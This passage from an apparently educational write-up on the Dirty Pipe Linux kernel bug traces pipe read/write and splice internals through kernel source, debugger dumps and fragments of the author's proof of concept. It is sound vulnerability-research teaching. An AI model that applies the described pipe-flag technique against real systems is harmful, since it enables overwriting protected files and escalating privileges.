&lt;p>To complete the rest of the write the kernel advances the &lt;code>head&lt;/code> to the next &lt;code>pipe_buffer&lt;/code>, allocates a fresh &lt;code>page&lt;/code> for it, initializes the flags (the&lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag will be set, unless the user explicitly asked for the pipe to be in &lt;code>O_DIRECT&lt;/code> mode), and writes the data to the beginning of the new page. This continues until there is no data left to write (or the pipe is full). Regarding the &lt;code>O_DIRECT&lt;/code> mode of &lt;code>pipe()&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>[...]
O_DIRECT (since Linux 3.4)
Create a pipe that performs I/O in &amp;quot;packet&amp;quot; mode. Each
write(2) to the pipe is dealt with as a separate packet,
and read(2)s from the pipe will read one packet at a time.
[...]
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://www.man7.org/linux/man-pages/man2/pipe.2.html">source&lt;/a>&lt;/p>
&lt;p>This is handled in the &lt;code>if&lt;/code>-condition &lt;code>is_packetized(filp)&lt;/code> in &lt;code>pipe_write()&lt;/code> (see above).&lt;/p>
&lt;p>We can also see these two types of writes in the debugger. The first write is into an empty pipe and thus initializes our previously zero-filled pipe buffer.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea00040e3bc0
&amp;gt; 'offset': 0
&amp;gt; 'len': 8
&amp;gt; 'ops': 0xffffffff8221bb00 &amp;lt;anon_pipe_buf_ops&amp;gt;
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
struct page at 0xffffea00040e3bc0
&amp;gt; virtual: 0xffff8881038ef000
&amp;gt; data: b'AAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
&lt;/code>&lt;/pre>&lt;p>All subsequent writes go down the &amp;ldquo;append path&amp;rdquo; and fill the existing page.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea00040e3bc0
&amp;gt; 'offset': 0
&amp;gt; 'len': 4096
&amp;gt; 'ops': 0xffffffff8221bb00 &amp;lt;anon_pipe_buf_ops&amp;gt;
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
struct page at 0xffffea00040e3bc0
&amp;gt; virtual: 0xffff8881038ef000
&amp;gt; data: b'AAAAAAAAAAAAAAAAAAAA'[...]b'AAAAAAAAAAAAAAAAAAAA'
&lt;/code>&lt;/pre>&lt;h3 id="reading">Reading&lt;/h3>
&lt;p>Next, the POC drains the pipe by consuming / &lt;code>read&lt;/code>ing all the &lt;code>A&lt;/code>s from the reading end.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span>
&lt;span style="color:#a6e22e">drain_pipe&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> pipefd_r) {
&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">8&lt;/span>];
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> PAGESIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">==&lt;/span> PAGESIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to perform last read() from pipe&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">if&lt;/span> (read(pipefd_r, buf, &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L34">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The case where a process asks the kernel to &lt;code>read()&lt;/code> from a pipe is handled by the function &lt;code>pipe_read()&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t
&lt;span style="color:#a6e22e">pipe_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> kiocb &lt;span style="color:#f92672">*&lt;/span>iocb, &lt;span style="color:#66d9ef">struct&lt;/span> iov_iter &lt;span style="color:#f92672">*&lt;/span>to)
{
size_t total_len &lt;span style="color:#f92672">=&lt;/span> iov_iter_count(to);
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp &lt;span style="color:#f92672">=&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_filp;
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe &lt;span style="color:#f92672">=&lt;/span> filp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>private_data;
&lt;span style="color:#66d9ef">bool&lt;/span> was_full, wake_next_reader &lt;span style="color:#f92672">=&lt;/span> false;
ssize_t ret;
...
ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
__pipe_lock(pipe);
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * We only wake up writers if the pipe was full when we started
&lt;/span>&lt;span style="color:#75715e"> * reading in order to avoid unnecessary wakeups.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * But when we do wake up writers, we do so using a sync wakeup
&lt;/span>&lt;span style="color:#75715e"> * (WF_SYNC), because we want them to get going and generate more
&lt;/span>&lt;span style="color:#75715e"> * data for us.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
was_full &lt;span style="color:#f92672">=&lt;/span> pipe_full(pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>head, pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tail, pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>max_usage);
&lt;span style="color:#66d9ef">for&lt;/span> (;;) {
&lt;span style="color:#75715e">/* Read -&amp;gt;head with a barrier vs post_one_notification() */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> head &lt;span style="color:#f92672">=&lt;/span> smp_load_acquire(&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>head);
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> tail &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tail;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> mask &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ring_size &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
...
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>pipe_empty(head, tail)) {
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs[tail &lt;span style="color:#f92672">&amp;amp;&lt;/span> mask];
size_t chars &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len;
size_t written;
&lt;span style="color:#66d9ef">int&lt;/span> error;
&lt;span style="color:#66d9ef">if&lt;/span> (chars &lt;span style="color:#f92672">&amp;gt;&lt;/span> total_len) {
...
chars &lt;span style="color:#f92672">=&lt;/span> total_len;
}
...
written &lt;span style="color:#f92672">=&lt;/span> copy_page_to_iter(buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>page, buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>offset, chars, to);
...
ret &lt;span style="color:#f92672">+=&lt;/span> chars;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>offset &lt;span style="color:#f92672">+=&lt;/span> chars;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len &lt;span style="color:#f92672">-=&lt;/span> chars;
...
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len) {
pipe_buf_release(pipe, buf);
...
tail&lt;span style="color:#f92672">++&lt;/span>;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tail &lt;span style="color:#f92672">=&lt;/span> tail;
...
}
total_len &lt;span style="color:#f92672">-=&lt;/span> chars;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>total_len)
&lt;span style="color:#66d9ef">break&lt;/span>; &lt;span style="color:#75715e">/* common path: read succeeded */&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>pipe_empty(head, tail)) &lt;span style="color:#75715e">/* More to do? */&lt;/span>
&lt;span style="color:#66d9ef">continue&lt;/span>;
}
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>writers)
&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (ret)
&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (filp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>f_flags &lt;span style="color:#f92672">&amp;amp;&lt;/span> O_NONBLOCK) {
ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>EAGAIN;
&lt;span style="color:#66d9ef">break&lt;/span>;
}
...
}
...
&lt;span style="color:#66d9ef">if&lt;/span> (ret &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
file_accessed(filp);
&lt;span style="color:#66d9ef">return&lt;/span> ret;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L231">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>If the pipe is non-empty, the data is taken from the &lt;code>tail&lt;/code>-indexed &lt;code>pipe_buffer&lt;/code> (in &lt;code>bufs&lt;/code>). In case, a buffer is emptied during a read, the &lt;code>release&lt;/code> function pointer of the &lt;code>ops&lt;/code> field of the &lt;code>pipe_buffer&lt;/code> is executed. For a &lt;code>pipe_buffer&lt;/code> that was initialized by an earlier &lt;code>write()&lt;/code>, the &lt;code>ops&lt;/code> field is a pointer to the &lt;code>struct pipe_buf_operations anon_pipe_buf_ops&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> pipe_buf_operations anon_pipe_buf_ops &lt;span style="color:#f92672">=&lt;/span> {
.release &lt;span style="color:#f92672">=&lt;/span> anon_pipe_buf_release,
.try_steal &lt;span style="color:#f92672">=&lt;/span> anon_pipe_buf_try_steal,
.get &lt;span style="color:#f92672">=&lt;/span> generic_pipe_buf_get,
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L214">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * pipe_buf_release - put a reference to a pipe_buffer
&lt;/span>&lt;span style="color:#75715e"> * @pipe: the pipe that the buffer belongs to
&lt;/span>&lt;span style="color:#75715e"> * @buf: the buffer to put a reference to
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">inline&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">pipe_buf_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe,
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>buf)
{
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> pipe_buf_operations &lt;span style="color:#f92672">*&lt;/span>ops &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ops;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ops &lt;span style="color:#f92672">=&lt;/span> NULL;
ops&lt;span style="color:#f92672">-&amp;gt;&lt;/span>release(pipe, buf);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L197">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">anon_pipe_buf_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe,
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>buf)
{
&lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>page &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>page;
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * If nobody else uses this page, and we don&amp;#39;t already have a
&lt;/span>&lt;span style="color:#75715e"> * temporary page, let&amp;#39;s keep track of it as a one-deep
&lt;/span>&lt;span style="color:#75715e"> * allocation cache. (Otherwise just release our reference to it)
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (page_count(page) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tmp_page)
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tmp_page &lt;span style="color:#f92672">=&lt;/span> page;
&lt;span style="color:#66d9ef">else&lt;/span>
put_page(page);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L125">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Thus, &lt;code>anon_pipe_buf_release()&lt;/code> is executed, which calls &lt;code>put_page()&lt;/code> to release our reference to the page. Note that while the &lt;code>ops&lt;/code> pointer is set to NULL to signal that be buffer has been released, the &lt;code>page&lt;/code> and &lt;code>flags&lt;/code> fields of the &lt;code>pipe_buffer&lt;/code> are left unmodified. It is thus the responsibility of code that might reuse a pipe buffer to initialize all its fields, otherwise the values are &amp;ldquo;uninitialized&amp;rdquo;. We can confirm this by printing the pipe structures after the last read.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_inode_info at 0xffff8881044aec00
&amp;gt; 'head': 1
&amp;gt; 'tail': 1
&amp;gt; 'ring_size': 1
&amp;gt; 'bufs': 0xffff888101f8a180
struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea00040e3bc0
&amp;gt; 'offset': 4096
&amp;gt; 'len': 0
&amp;gt; 'ops': NULL
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
&lt;/code>&lt;/pre>&lt;h3 id="summary">Summary&lt;/h3>
&lt;p>For us, the key takeaways are:&lt;/p>
&lt;ol>
&lt;li>Writes to a pipe can append to the &lt;code>page&lt;/code> of a &lt;code>pipe_buffer&lt;/code> if its &lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag is set.&lt;/li>
&lt;li>This flag is set by default for buffers that are initialized by writes.&lt;/li>
&lt;li>Emptying a pipe with a &lt;code>read()&lt;/code> leaves the &lt;code>pipe_buffer&lt;/code>s' flags unmodified.&lt;/li>
&lt;/ol>
&lt;p>However, &lt;code>write&lt;/code>s to a pipe are not the only way fill it!&lt;/p>
&lt;h2 id="pipes-splicing">Pipes (splicing)&lt;/h2>
&lt;p>Besides reading and writing, the Linux programming interface also offers the &lt;code>splice&lt;/code> syscall for moving data from or to a pipe. This is what our PoC does next.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c"> pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to splice() file to pipe&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (splice(tfd, &lt;span style="color:#ae81ff">0&lt;/span>, pipefds[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L76">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Since this syscall may not be as well-known as the others, let&amp;rsquo;s briefly discuss it from a user&amp;rsquo;s perspective.&lt;/p>
&lt;h3 id="the-splice-system-call-user-land">The &lt;code>splice&lt;/code> System Call (user land)&lt;/h3>
&lt;pre tabindex="0">&lt;code>SPLICE(2) Linux Programmer's Manual SPLICE(2)
NAME
splice - splice data to/from a pipe
SYNOPSIS
#define _GNU_SOURCE /* See feature_test_macros(7) */
#include &amp;lt;fcntl.h&amp;gt;
ssize_t splice(int fd_in, off64_t *off_in, int fd_out,
off64_t *off_out, size_t len, unsigned int flags);
DESCRIPTION
splice() moves data between two file descriptors without copying between kernel
address space and user address space. It transfers up to len bytes of data from
the file descriptor fd_in to the file descriptor fd_out, where one of the file
descriptors must refer to a pipe.
The following semantics apply for fd_in and off_in:
* If fd_in refers to a pipe, then off_in must be NULL.
* If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from
fd_in starting from the file offset, and the file offset is adjusted appropri‐
ately.
* If fd_in does not refer to a pipe and off_in is not NULL, then off_in must
point to a buffer which specifies the starting offset from which bytes will be
read from fd_in; in this case, the file offset of fd_in is not changed.
Analogous statements apply for fd_out and off_out.
&lt;/code>&lt;/pre>&lt;p>As mentioned above, a process can obtain a file descriptor using the &lt;code>sys_open&lt;/code> system call. If the process wishes to write the file content (or a part of it) into a pipe it has different options. It could &lt;code>read()&lt;/code> the data from the file into a buffer in its memory (or &lt;code>mmap()&lt;/code> the file) and then &lt;code>write()&lt;/code> it to the pipe. However, this involves a total of three context switches (kernel-user-space boundary). To make this whole operation more efficient the Linux kernel implements the &lt;code>sys_splice&lt;/code> system call. It essentially does the copying (not really a copy, see below) directly from one file descriptor to another one within the kernel space. As we will see, this makes a lot of sense because the content of a file or a pipe is already present in the kernel memory as a buffer or page or another structure.
One of &lt;code>fd_in&lt;/code> or &lt;code>fd_out&lt;/code> must be a pipe. The other &lt;code>fd_xxx&lt;/code> can be another pipe, a file, a socket, a block device, a character device. See Max Kellermann&amp;rsquo;s original blog post for an example how splicing is used to optimize real-world software (and how this application lead him to finding this bug :) Check out &lt;a href="https://web.archive.org/web/20130521163124/http://kerneltrap.org/node/6505">this&lt;/a> to read how Linus Torvalds himself explains the &lt;code>splice&lt;/code> system call 8-)&lt;/p>
&lt;h3 id="the-splice-system-call-implementation">The &lt;code>splice&lt;/code> System Call (Implementation)&lt;/h3>
&lt;p>The &lt;em>very&lt;/em> high level idea of the &lt;code>splice&lt;/code> implementation is illustrated in the following figure. After splicing, both, the pipe and the page cache, have different views of the same underlying data in memory. &lt;em>You might want to open this SVG image in a new tab and zoom in a bit.&lt;/em>
&lt;img src="https://lolcads.github.io/2022/06/pipe_and_page_cache.svg" alt="Pipe and Page Cache Overview">&lt;/p>
&lt;p>To see that this figure is correct, we start from the system call&amp;rsquo;s entry point &lt;code>SYSCALL_DEFINE6(splice,...)&lt;/code>, and first arrive at the function &lt;code>__do_splice()&lt;/code> that is responsible for copying the offset values from and to user space. The called function &lt;code>do_splice()&lt;/code> determines if we want to splice to, from or between pipes. In the first case the function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">do_splice_to&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>in, loff_t &lt;span style="color:#f92672">*&lt;/span>ppos,
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe, size_t len,
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> flags);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>is called, which executes&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">in&lt;span style="color:#f92672">-&amp;gt;&lt;/span>f_op&lt;span style="color:#f92672">-&amp;gt;&lt;/span>splice_read(in, ppos, pipe, len, flags);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/splice.c#L773">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>From here on, the execution path depends on the type of file we want to splice to the pipe. Since our target is a regular file and our VM uses the &lt;code>ext2&lt;/code> file system, the correct implementation is found in &lt;code>ext2_file_operations&lt;/code>. Note: If you debug the exploit on another machine with e.g. ext4 file system, feel free to follow this path&amp;hellip; we&amp;rsquo;ll meet again later ;) If you interested in this nice abstraction check out the &lt;a href="https://www.kernel.org/doc/html/latest/filesystems/vfs.html">Linux Virtual File System&lt;/a> documentation.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations ext2_file_operations &lt;span style="color:#f92672">=&lt;/span> {
...
.read_iter &lt;span style="color:#f92672">=&lt;/span> ext2_file_read_iter,
...
.splice_read &lt;span style="color:#f92672">=&lt;/span> generic_file_splice_read,
...
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/ext2/file.c#L182">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Calling &lt;code>generic_file_splice_read()&lt;/code> (eventually&amp;hellip;) leads us to &lt;code>filemap_read()&lt;/code>. Notice that at this point we switch from the file system &lt;code>fs/&lt;/code> into the &lt;a href="https://www.kernel.org/doc/html/latest/core-api/mm-api.html">memory management&lt;/a> &lt;code>mm/&lt;/code> subsystem of the kernel.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * filemap_read - Read data from the page cache.
&lt;/span>&lt;span style="color:#75715e"> * @iocb: The iocb to read.
&lt;/span>&lt;span style="color:#75715e"> * @iter: Destination for the data.
&lt;/span>&lt;span style="color:#75715e"> * @already_read: Number of bytes already read by the caller.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * Copies data from the page cache. If the data is not currently present,
&lt;/span>&lt;span style="color:#75715e"> * uses the readahead and readpage address_space operations to fetch it.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * Return: Total number of bytes copied, including those already read by
&lt;/span>&lt;span style="color:#75715e"> * the caller. If an error happens before any bytes are copied, returns
&lt;/span>&lt;span style="color:#75715e"> * a negative error number.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
ssize_t &lt;span style="color:#a6e22e">filemap_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> kiocb &lt;span style="color:#f92672">*&lt;/span>iocb, &lt;span style="color:#66d9ef">struct&lt;/span> iov_iter &lt;span style="color:#f92672">*&lt;/span>iter,
ssize_t already_read)
{
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp &lt;span style="color:#f92672">=&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_filp;
&lt;span style="color:#66d9ef">struct&lt;/span> file_ra_state &lt;span style="color:#f92672">*&lt;/span>ra &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>filp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>f_ra;
&lt;span style="color:#66d9ef">struct&lt;/span> address_space &lt;span style="color:#f92672">*&lt;/span>mapping &lt;span style="color:#f92672">=&lt;/span> filp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>f_mapping;
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode &lt;span style="color:#f92672">=&lt;/span> mapping&lt;span style="color:#f92672">-&amp;gt;&lt;/span>host;
&lt;span style="color:#66d9ef">struct&lt;/span> folio_batch fbatch;
...
folio_batch_init(&lt;span style="color:#f92672">&amp;amp;&lt;/span>fbatch);
...
&lt;span style="color:#66d9ef">do&lt;/span> {
...
error &lt;span style="color:#f92672">=&lt;/span> filemap_get_pages(iocb, iter, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fbatch);
...
&lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> folio_batch_count(&lt;span style="color:#f92672">&amp;amp;&lt;/span>fbatch); i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">struct&lt;/span> folio &lt;span style="color:#f92672">*&lt;/span>folio &lt;span style="color:#f92672">=&lt;/span> fbatch.folios[i];
size_t fsize &lt;span style="color:#f92672">=&lt;/span> folio_size(folio);
size_t offset &lt;span style="color:#f92672">=&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos &lt;span style="color:#f92672">&amp;amp;&lt;/span> (fsize &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
size_t bytes &lt;span style="color:#f92672">=&lt;/span> min_t(loff_t, end_offset &lt;span style="color:#f92672">-&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos,
fsize &lt;span style="color:#f92672">-&lt;/span> offset);
size_t copied;
...
copied &lt;span style="color:#f92672">=&lt;/span> copy_folio_to_iter(folio, offset, bytes, iter);
already_read &lt;span style="color:#f92672">+=&lt;/span> copied;
iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos &lt;span style="color:#f92672">+=&lt;/span> copied;
ra&lt;span style="color:#f92672">-&amp;gt;&lt;/span>prev_pos &lt;span style="color:#f92672">=&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos;
...
}
...
folio_batch_init(&lt;span style="color:#f92672">&amp;amp;&lt;/span>fbatch);
